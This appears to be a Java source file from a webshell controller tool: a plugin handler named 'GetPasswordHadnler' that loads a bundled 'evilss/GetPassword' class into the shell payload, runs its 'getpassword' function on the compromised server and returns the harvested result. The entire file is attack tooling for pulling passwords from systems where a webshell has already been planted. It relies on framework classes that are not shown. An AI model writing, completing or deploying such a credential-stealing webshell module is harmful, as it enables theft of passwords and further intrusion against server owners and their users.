package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class GetPasswordHadnler extends HandlerBase{
    public String handler() {
        this.payload.include("GetPassword", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/GetPassword.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("GetPassword", "getpassword", reqParameter));
    }
}
